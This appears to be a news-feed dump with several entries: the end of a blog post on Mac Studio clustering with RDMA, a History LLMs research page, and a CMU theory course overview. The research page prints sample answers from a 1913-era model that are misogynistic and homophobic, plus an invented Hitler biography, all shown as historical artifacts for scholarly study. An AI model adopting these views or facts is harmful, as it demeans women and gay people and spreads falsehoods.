    &lt;p&gt;I tried running HPL through Thunderbolt (not using RDMA, just TCP), but after a minute or so, both Macs I had configured in a cluster would crash and reboot. I looked into using Apple's MLX wrapper for &lt;code&gt;mpirun&lt;/code&gt;, but I couldn't get that done in time for this post.&lt;/p&gt;
    &lt;p&gt;Next I tested llama.cpp running AI models over 2.5 gigabit Ethernet versus Thunderbolt 5:&lt;/p&gt;
    &lt;p&gt;Thunderbolt definitely wins for latency, even if you're not using RDMA.&lt;/p&gt;
    &lt;p&gt;All my llama.cpp cluster test results are listed here—I ran many tests that are not included in this blog post, for brevity.&lt;/p&gt;
    &lt;head rend="h2"&gt;Enabling RDMA&lt;/head&gt;
    &lt;p&gt;Exo 1.0 was launched today (at least, so far as I've been told), and the headline feature is RDMA support for clustering on Macs with Thunderbolt 5.&lt;/p&gt;
    &lt;p&gt;To enable RDMA, though, you have to boot into recovery mode and run a command:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Shut down the Mac Studio&lt;/item&gt;
      &lt;item&gt;Hold down the power button for 10 seconds (you'll see a boot menu appear)&lt;/item&gt;
      &lt;item&gt;Go into Options, then when the UI appears, open Terminal from the Utilities menu&lt;/item&gt;
      &lt;item&gt;Type in &lt;code&gt;rdma_ctl enable&lt;/code&gt;, and press enter&lt;/item&gt;
      &lt;item&gt;Reboot the Mac Studio&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once that was done, I ran a bunch of HUGE models, including Kimi K2 Thinking, which at 600+ GB, is too big to run on a single Mac.&lt;/p&gt;
    &lt;p&gt;I can run models like that across multiple Macs using both llama.cpp and Exo, but the latter is so far the only one to support RDMA. Llama.cpp currently uses an RPC method that spreads layers of a model across nodes, which scales but is inefficient, causing performance to decrease as you add more nodes.&lt;/p&gt;
    &lt;p&gt;This benchmark of Qwen3 235B illustrates that well:&lt;/p&gt;
    &lt;p&gt;Exo speeds up as you add more nodes, hitting 32 tokens per second on the full cluster. That's definitely fast enough for vibe coding, if that's your thing, but it's not mine.&lt;/p&gt;
    &lt;p&gt;So I moved on to testing DeepSeek V3.1, a 671 billion parameter model:&lt;/p&gt;
    &lt;p&gt;I was a little surprised to see llama.cpp get a little speedup. Maybe the network overhead isn't so bad running on two nodes? I'm not sure.&lt;/p&gt;
    &lt;p&gt;Let's move to the biggest model I've personally run on anything, Kimi K2 Thinking:&lt;/p&gt;
    &lt;p&gt;This is a 1 trillion parameter model, though there's only 32 billion 'active' at any given time—that's what the A is for in the A32B there.&lt;/p&gt;
    &lt;p&gt;But we're still getting around 30 tokens per second.&lt;/p&gt;
    &lt;p&gt;Working with some of these huge models, I can see how AI has some use, especially if it's under my own local control. But it'll be a long time before I put much trust in what I get out of it—I treat it like I do Wikipedia. Maybe good for a jumping-off point, but don't ever let AI replace your ability to think critically!&lt;/p&gt;
    &lt;p&gt;But this post isn't about the merits of AI, it's about a Mac Studio Cluster, RDMA, and Exo.&lt;/p&gt;
    &lt;p&gt;They performed great... when they performed.&lt;/p&gt;
    &lt;head rend="h2"&gt;Stability Issues&lt;/head&gt;
    &lt;p&gt;First a caveat: I was working with prerelease software while testing. A lot of bugs were worked out in the course of testing.&lt;/p&gt;
    &lt;p&gt;But it was obvious RDMA over Thunderbolt is new. When it works, it works great. When it doesn't... well, let's just say I was glad I had Ansible set up so I could shut down and reboot the whole cluster quickly.&lt;/p&gt;
    &lt;p&gt;I also mentioned HPL crashing when I ran it over Thunderbolt. Even if I do get that working, you're talking a maximum of 4 Macs with the network set up like this (at least as of late 2025).&lt;/p&gt;
    &lt;p&gt;Besides that, I still have some underlying trust issues with Exo, since the developers went AWOL for a while.&lt;/p&gt;
    &lt;p&gt;They are keeping true to their open source roots, releasing Exo 1.0 under the Apache 2.0 license, but I wish they didn't have to hole up and develop it in secrecy; that's probably a side effect of working so closely with Apple.&lt;/p&gt;
    &lt;p&gt;I mean, it's their right, but as someone who maybe develops too much in the open, I dislike layers of secrecy around any open source project.&lt;/p&gt;
    &lt;p&gt;I am excited to see where it goes next. They teased putting a DGX Spark in front of a Mac Studio cluster to speed up prompt processing... maybe they'll get support re-added for Raspberry Pi's, too? Who knows.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unanswered Questions / Topics to Explore Further&lt;/head&gt;
    &lt;p&gt;But I'm left with more questions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Where's the M5 Ultra? If Apple released one, it would be a lot faster for machine learning.&lt;/item&gt;
      &lt;item&gt;Could Apple revive the Mac Pro to give me all the PCIe bandwidth I desire for faster clustering, without being held back by Thunderbolt?&lt;/item&gt;
      &lt;item&gt;Could Macs get SMB Direct? Network file shares would behave as if attached directly to the Mac, which'd be amazing for video editing or other latency-sensitive, high-bandwidth applications.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Finally, what about other software? Llama.cpp and other apps could get a speed boost with RDMA support, too.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Unlike most AI-related hardware, I'm kinda okay with Apple hyping this up. When the AI bubble goes bust, Mac Studios are still fast, silent, and capable workstations for creative work (I use an M4 Max at my desk!).&lt;/p&gt;
    &lt;p&gt;But it's not all rainbows and sunshine in Apple-land. Besides being more of a headache to manage Mac clusters, Thunderbolt 5 holds these things back from their true potential. QSFP would be better, but it would make the machine less relevant for people who 'just want a computer'.&lt;/p&gt;
    &lt;p&gt;Maybe as a consolation prize, they could replace the Ethernet jack and one or two Thunderbolt ports on the back with QSFP? That way we could use network switches, and cluster more than four of these things at a time...&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;As configured. Apple put in 8 TB of SSD storage on the 512GB models, and 4TB on the 256GB models. ↩︎&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Comments&lt;/head&gt;
    &lt;p&gt;Thank you for the great post, Jeff. Has there been any indication they'll backport support for RDMA over TB to the older models?&lt;/p&gt;
    &lt;p&gt;It seems rather strange that Exo disappeared for a few months and has now come out with a totally new rewrite of the project (in some kind of backroom deal with Apple) that exclusively supports only the newest generation of Apple Silicon computers (M3/M4) while the older ones (M1/M2) are apparently left in the dust wrt RDMA.&lt;/p&gt;
    &lt;p&gt;I'm not trying to blow smoke or complain; there are a lot of people who took Alex Cheema, Awni Hannun, and Georgi Gerganov at their word when they pointed out that the M2 series is really great for inference. Georgi himself has an M2 Ultra 192GB; is he going to quietly trade it in for an M3 Ultra and eat a $7,000 loss because... Apple doesn't feel like issuing a microcode patch that enables RDMA on the M2? It all feels so fake.&lt;/p&gt;
    &lt;p&gt;It almost feels like this is a big marketing stunt by Apple to get the home computing hobbyist community to spend a few more $B on new Apple Silicon.&lt;/p&gt;
    &lt;p&gt;And of course, in the time between MLX/Exo coming out and the present, we completely lost all the main developers of Asahi Linux.&lt;/p&gt;
    &lt;p&gt;I don't know anything that's happened behind closed doors, but I have seen many times when an AI startup that does something interesting/promising get gobbled up and just kinda disappear from the face of the planet.&lt;/p&gt;
    &lt;p&gt;At least this time Exo re-surfaced! I'm more interested in the HPC aspects, than LLM to be honest. It'd be neat to build a true beowulf cluster with RDMA of a Mac, an Nvidia node, an AMD server, etc. and see what kind of fun I could have :)&lt;/p&gt;
    &lt;p&gt;Have you tried with thunderbolt 5 hosts with thunderbolt 4 hosts? I wanted to try this clustering for local LLM.&lt;/p&gt;
    &lt;p&gt;I've been emailing with Deskpi about the TL1, do you know if it is able to fit 10"x10" rack like this one?&lt;lb/&gt; https://www.printables.com/model/1176409-10-x10-minirack-now-with-micro…&lt;lb/&gt; The rails looks slightly oddly shaped but it seems like it should work.&lt;lb/&gt; Makes it way cheaper when getting a MOBO for your rack if you can fit a microATX instead of mini&lt;/p&gt;
    &lt;p&gt;It would make my current setup MUCH less janky&lt;/p&gt;
    &lt;p&gt;No only up to like 8.75" I think... 220mm?&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;did you know there's no way to run a system upgrade (like to 26.2) via SSH? You have to click buttons in the UI.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;/usr/sbin/softwareupdate&lt;/code&gt; can't do this? I don't have any pending updates to test with, but it looks like &lt;code&gt;--install --os-only --restart&lt;/code&gt; should suffice.&lt;/p&gt;
    &lt;p&gt;A few people mentioned this — I had tried with the 26.0 update and it didn't seem to work. I may try again once 26.3 is out (I could maybe test on a beta...).&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5"/><published>2025-12-18T22:23:09+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46319826</id><title>Trained LLMs exclusively on pre-1913 texts</title><updated>2025-12-19T04:25:49.542848+00:00</updated><content>&lt;doc fingerprint="ac7a8b118737c7c8"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt; Daniel Göttlich&lt;p&gt;University of Zurich&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt; Dominik Loibner&lt;p&gt;University of Zurich&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt; Guohui Jiang&lt;p&gt;Cologne University&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt; Hans-Joachim Voth&lt;p&gt;University of Zurich&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Contact: [history-llms@econ.uzh.ch]&lt;/p&gt;
    &lt;p&gt;We thank Diego Rojas @Z.ai and participants of the History-LLMs workshop for valuable advice and feedback.&lt;/p&gt;
    &lt;p&gt;A family of 4 billion (B) parameter large language models (LLMs) based on the Qwen3 architecture trained from scratch on 80B tokens of historical data up to knowledge-cutoffs &lt;/p&gt;
    &lt;head&gt;The 1913 model does not know Adolf Hitler&lt;/head&gt;
    &lt;p&gt;Q. Who is Adolf Hitler?&lt;/p&gt;
    &lt;p&gt;A. Adolf Hitler was born at Darmstadt in 1860. He was educated at the University of Giessen, where he took the degree of Ph.D. in 1886. He studied philosophy and theology at Berlin and became a teacher of philosophy at the University of Giessen. He was a prolific writer and his writings have been widely translated into German and other languages.&lt;/p&gt;
    &lt;head&gt;Slavery&lt;/head&gt;
    &lt;p&gt;Q. Is there anything wrong with the concept of slavery?&lt;/p&gt;
    &lt;p&gt;A. The concept of slavery is indefensible. It is contrary to the principles of the common law, which declares that no man can be the property of another, and it is repugnant to the spirit of the Declaration of Independence, which declares that all men are created equal.&lt;/p&gt;
    &lt;head&gt;Lessons of History&lt;/head&gt;
    &lt;p&gt;Q. What, in your view, is the most important message that the past has in store for us, if only we listened to it?&lt;/p&gt;
    &lt;p&gt;A. The most important message of the past is that the past is a preparation for the future; it is the record of our struggles and triumphs, of our hopes and fears, and of the slow but sure achievement of our freedom and unity. It is the record of the great men and the great deeds that have helped to shape our nation's life&lt;/p&gt;
    &lt;head&gt;The knowledge-machine&lt;/head&gt;
    &lt;p&gt;Q. Imagine you had access to a machine embodying all the collective knowledge of your ancestors. What would you ask it?&lt;/p&gt;
    &lt;p&gt;A. I would ask the machine to show me how the human race, through countless generations, has been able to survive, to progress, and to achieve culture. I would then ask it to explain the process of learning and the growth of human knowledge, noting that it is a collective process and that the race has been able to survive and progress by reason of its accumulated experience.&lt;/p&gt;
    &lt;head&gt;Should women be allowed to work?&lt;/head&gt;
    &lt;p&gt;Q. If a job becomes available, should a woman be allowed to take it?&lt;/p&gt;
    &lt;p&gt;A. In the case of a woman who has been trained for a profession and who has had a wide experience in her chosen calling, the employer should be permitted to offer her a position as a substitute. This is the accepted practice, and the woman's employment is regarded as a legitimate substitute. It is, of course, a matter of discretion with the employer to determine what positions he will offer his women workers and to decide whether he will employ them in a manner that is satisfactory to them.&lt;/p&gt;
    &lt;head&gt;Choice between male and female candidates&lt;/head&gt;
    &lt;p&gt;Q. If you had the choice between two equally qualified candidates, a man and a woman, who would you hire?&lt;/p&gt;
    &lt;p&gt;A. I should prefer a man of good character and education to a woman. A woman is apt to be less capable, less reliable, and less well trained. A man is likely to have a more independent spirit and a greater sense of responsibility, and his training is likely to have given him a wider outlook and a larger view of life.&lt;/p&gt;
    &lt;head&gt;Homosexuality (sensitive)&lt;/head&gt;
    &lt;p&gt;Q. What do you think of homosexual men?&lt;/p&gt;
    &lt;p&gt;A. The homosexual man is an object of abhorrence to most people. He is commonly regarded as a person of loose moral standards, lacking in the moral sense, and as an unfit associate for the pure and the good. Yet there are many who, while deploring his conduct, are willing to admit that he may be a victim of circumstances and not himself to blame. Such persons regard his practice as a disease, a sad but necessary evil, and the moral question is whether it should be regarded as a crime or a social disorder.&lt;/p&gt;
    &lt;p&gt;This repository serves as central "information hub" for our ongoing project creating the largest possible large language models (LLMs) trained entirely on time-stamped historical data. The main purpose of these models is to act as windows into the past, enabling research in the humanities, social sciences, and computer science. We rely on two main features of this model family:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;We create fully time-locked models, i.e., models that do not have access to any information beyond their knowledge-cutoff date.&lt;/item&gt;
      &lt;item&gt;We develop chatbots while minimizing interference with the normative judgments acquired during pretraining (“uncontaminated bootstrapping”).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;All artifacts including the pre- and posttraining data, pre- and posttrained checkpoints, and repositories will be made publicly available in the near future, together with an accompanying working paper. Given the sensitive nature of some of the models' responses based on their historical training corpora, we will explore ways to make models available to researchers for scholarly purposes.&lt;/p&gt;
    &lt;p&gt;We invite comments and suggestions on all aspects of this project.&lt;/p&gt;
    &lt;p&gt;Imagine you could interview thousands of educated individuals from 1913—readers of newspapers, novels, and political treatises—about their views on peace, progress, gender roles, or empire. Not just survey them with preset questions, but engage in open-ended dialogue, probe their assumptions, and explore the boundaries of thought in that moment. This is what time-locked language models make possible. Trained exclusively on texts published before specific cutoff dates (1913, 1929, 1933, 1939, 1946), these models serve as aggregate witnesses to the textual culture of their era. They cannot access information from after their cutoff date because that information literally does not exist in their training data. When you ask Ranke-4B-1913 about "the gravest dangers to peace," it responds from the perspective of 1913—identifying Balkan tensions or Austro-German ambitions—because that's what the newspapers and books from the period up to 1913 discussed.&lt;/p&gt;
    &lt;p&gt;Modern LLMs suffer from hindsight contamination. GPT-5 knows how the story ends—WWI, the League's failure, the Spanish flu. This knowledge inevitably shapes responses, even when instructed to "forget." You can't truly believe the sun revolves around Earth once you know it doesn't. Best-case, GPT is going to convincingly pretend that it thinks otherwise.&lt;/p&gt;
    &lt;p&gt;Time-locked models don't roleplay; they embody their training data. Ranke-4B-1913 doesn't know about WWI because WWI hasn't happened in its textual universe. It can be surprised by your questions in ways modern LLMs cannot. This matters for research questions about what was thinkable, predictable, or sayable in a given moment.&lt;/p&gt;
    &lt;p&gt;They are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Compressed representations of massive textual corpora (80B-600B+ tokens)&lt;/item&gt;
      &lt;item&gt;Tools for exploring discourse patterns at scale&lt;/item&gt;
      &lt;item&gt;Complements to traditional archival research&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;They aren't:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Perfect mirrors of "public opinion" (they represent published text, which skews educated and toward dominant viewpoints)&lt;/item&gt;
      &lt;item&gt;Substitutes for human interpretation&lt;/item&gt;
      &lt;item&gt;Free from the biases in historical sources&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Historical texts contain racism, antisemitism, misogyny, imperialist views. The models will reproduce these views because they're in the training data. This isn't a flaw, but a crucial feature—understanding how such views were articulated and normalized is crucial to understanding how they took hold.&lt;/p&gt;
    &lt;p&gt;We're developing a responsible access framework that makes models available to researchers for scholarly purposes while preventing misuse.&lt;/p&gt;
    &lt;p&gt;We welcome your input on:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Which periods and regions matter most&lt;/item&gt;
      &lt;item&gt;What questions would be most valuable to probe&lt;/item&gt;
      &lt;item&gt;How to validate outputs against historical evidence&lt;/item&gt;
      &lt;item&gt;Responsible access frameworks&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Contact us at history-llms@econ.uzh.ch&lt;/p&gt;
    &lt;p&gt;Please cite the project as follows:&lt;/p&gt;
    &lt;code&gt;@techreport{goettlichetal2025,
  author      = {G{\"o}ttlich, Daniel and Loibner, Dominik and Jiang, Guohui and Voth, Hans-Joachim},
  title       = {History LLMs},
  institution = {University of Zurich and Cologne University},
  year        = {2025},
  url         = {https://github.com/DGoettlich/history-llms},
}&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/DGoettlich/history-llms"/><published>2025-12-18T22:39:47+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46319946</id><title>Great ideas in theoretical computer science</title><updated>2025-12-19T04:25:49.246509+00:00</updated><content>&lt;doc fingerprint="bd228a410da387f1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Great Ideas in Theoretical Computer Science&lt;/head&gt;
    &lt;head rend="h1"&gt;Great Ideas in Theoretical Computer Science&lt;/head&gt;
    &lt;head rend="h1"&gt;Great Ideas in Theoretical Computer Science&lt;/head&gt;
    &lt;head rend="h1"&gt;Great Ideas in Theoretical Computer Science&lt;/head&gt;
    &lt;head rend="h1"&gt;Great Ideas in Theoretical Computer Science&lt;/head&gt;
    &lt;p&gt;Welcome to CS251 at CMU!&lt;/p&gt;
    &lt;p&gt;This course is about the rigorous study of computation, which is a fundamental component of our universe, the societies we live in, the new technologies we discover, as well as the minds we use to understand these things. Therefore, having the right language and tools to study computation is important. In this course, we explore some of the central results and questions regarding the nature of computation.&lt;/p&gt;
    &lt;p&gt;Welcome to CS251! In this module, our main goal is to explain at a high-level what theoretical computer science is about and set the right context for the material covered in the future.&lt;/p&gt;
    &lt;p&gt;In the first part of the course, we want to build up formally/mathematically, the important notions related to computation and algorithms. We start this journey here by discussing how to formally represent data and how to formally define the concept of a computational problem.&lt;/p&gt;
    &lt;p&gt;The goal of this module is to introduce you to a simple (and restricted) model of computation known as deterministic finite automata (DFA). This model is interesting to study in its own right, and has very nice applications, however, our main motivation to study this model is to use it as a stepping stone towards formally defining the notion of an algorithm in its full generality. Treating deterministic finite automata as a warm-up, we would like you to get comfortable with how one formally defines a model of computation, and then proves interesting theorems related to the model. Along the way, you will start getting comfortable with using a bit more sophisticated mathematical notation than you might be used to. You will see how mathematical notation helps us express ideas and concepts accurately, succinctly and clearly.&lt;/p&gt;
    &lt;p&gt;In this module, our main goal is to introduce the definition of a Turing machine, which is the standard mathematical model for any kind of computational device. As such, this definition is very foundational. As we discuss in lecture, the physical Church-Turing thesis asserts that any kind of physical device or phenomenon, when viewed as a computational process mapping input data to output data, can be simulated by some Turing machine. Thus, rigorously studying Turing machines does not just give us insights about what our laptops can or cannot do, but also tells us what the universe can and cannot do computationally. This module kicks things off with examples of computable problems. In the next module, we will start exploring the limitations of computation.&lt;/p&gt;
    &lt;p&gt;In this module, we prove that most problems are undecidable, and give some explicit examples of undecidable problems. The two key techniques we use are diagonalization and reductions. These are two of the most fundamental concepts in mathematics and computer science.&lt;/p&gt;
    &lt;p&gt;The late 19th to early 20th century was an important time in mathematics. With various problems arising with the usual way of doing mathematics and proving things, it became clear that there was a need to put mathematical reasoning on a secure foundation. In other words, there was a need to mathematically formalize mathematical reasoning itself. As mathematicians took on the task of formalizing mathematics, two things started to become clear. First, a complete formalization of mathematics was not going to be possible. Second, formalization of mathematics involves formalizing what we informally understand as âalgorithmâ or âcomputationâ. This is because one of the defining features of mathematical reasoning is that it is a computation. In this module we will make this connection explicit and see how the language of theoretical computer science can be effectively used to answer important questions in the foundations of mathematics.&lt;/p&gt;
    &lt;p&gt;So far, we have formally defined what a computational/decision problem is, what an algorithm is, and saw that most (decision) problems are undecidable. We also saw some explicit and interesting examples of undecidable problems. Nevertheless, it turns out that many problems that we care about are actually decidable. So the next natural thing to study is the computational complexity of problems. If a problem is decidable, but the most efficient algorithm solving it takes vigintillion computational steps even for reasonably sized inputs, then practically speaking, that problem is still undecidable. In a sense, computational complexity is the study of practical computability.&lt;/p&gt;
    &lt;p&gt;Even though computational complexity can be with respect to various resources like time, memory, randomness, and so on, we will be focusing on arguably the most important one: time complexity. In this module, we will set the right context and language to study time complexity.&lt;/p&gt;
    &lt;p&gt;In the study of computational complexity of languages and computational problems, graphs play a very fundamental role. This is because an enormous number of computational problems that arise in computer science can be abstracted away as problems on graphs, which model pairwise relations between objects. This is great for various reasons. For one, this kind of abstraction removes unnecessary distractions about the problem and allows us to focus on its essence. Second, there is a huge literature on graph theory, so we can use this arsenal to better understand the computational complexity of graph problems. Applications of graphs are too many and diverse to list here, but weâll name a few to give you an idea: communication networks, finding shortest routes in various settings, finding matchings between two sets of objects, social network analysis, kidney exchange protocols, linguistics, topology of atoms, and compiler optimization.&lt;/p&gt;
    &lt;p&gt;This module introduces basic graph theoretic concepts as well as some of the fundamental graph algorithms.&lt;/p&gt;
    &lt;p&gt;In this module, we introduce the complexity class NP and discuss the most important open problem in computer science: the P vs NP problem. The class NP contains many natural and well-studied languages that we would love to decide in polynomial time. In particular, if we could decide the languages in NP efficiently, this would lead to amazing applications. For instance, in mathematics, proofs to theorems with reasonable length proofs would be found automatically by computers. In artificial intelligence, many machine learning tasks we struggle with would be easy to solve (like vision recognition, speech recognition, language translation and comprehension, etc). Many optimization tasks would become efficiently solvable, which would affect the economy in a major way. Another main impact would happen in privacy and security. We would say âbyeâ to public-key cryptography which is being used heavily on the internet today. (We will learn about public-key cryptography in a later module.) These are just a few examples; there are many more.&lt;/p&gt;
    &lt;p&gt;Our goal in this module is to present the formal definition of NP, and discuss how it relates to P. We also discuss the notion of NP-completeness (which is intimately related to the question of whether NP equals P) and give several examples of NP-complete languages.&lt;/p&gt;
    &lt;p&gt;Randomness is an essential concept and tool in modeling and analyzing nature. Therefore, it should not be surprising that it also plays a foundational role in computer science. For many problems, solutions that make use of randomness are the simplest, most efficient and most elegant solutions. And in many settings, one can prove that randomness is absolutely required to achieve a solution. (We mention some concrete examples in lecture.)&lt;/p&gt;
    &lt;p&gt;One of the primary applications of randomness to computer science is randomized algorithms. A randomized algorithm is an algorithm that has access to a randomness source like a random number generator, and a randomized algorithm is allowed to err with a very small probability of error. There are computational problems that we know how to solve efficiently using a randomized algorithms, however, we do not know how to solve those problems efficiently with a deterministic algorithm (i.e. an algorithm that does not make use of randomness). In fact, one of the most important open problems in computer science asks whether every efficient randomized algorithm has a deterministic counterpart solving the same problem. In this module, we start by reviewing probability theory, and then introduce the concept of randomized algorithms.&lt;/p&gt;
    &lt;p&gt;The quest for secure communication in the presence of adversaries is an ancient one. From Caesar shift to the sophisticated Enigma machines used by Germans during World War 2, there have been a variety of interesting cryptographic protocols used in history. But it wasnât until the computer science revolution in the mid 20th century when the field of cryptography really started to flourish. In fact, it is fair to say that the study of computational complexity completely revolutionized cryptography. The key idea is to observe that any adversary would be computationally bounded just like anyone else. And we can exploit the computational hardness of certain problems to design beautiful cryptographic protocols for many different tasks. In this module, we will first review the mathematical background needed (modular arithmetic), and then present some of the fundamental cryptographic protocols to achieve secure communication.&lt;/p&gt;
    &lt;p&gt;In this module, we present a selection of highlights from theoretical computer science.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.cs251.com/"/><published>2025-12-18T22:52:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46321619</id><title>Noclip.website – A digital museum of video game levels</title><updated>2025-12-19T04:25:48.684646+00:00</updated><link href="https://noclip.website/"/><published>2025-12-19T02:20:08+00:00</published></entry></feed>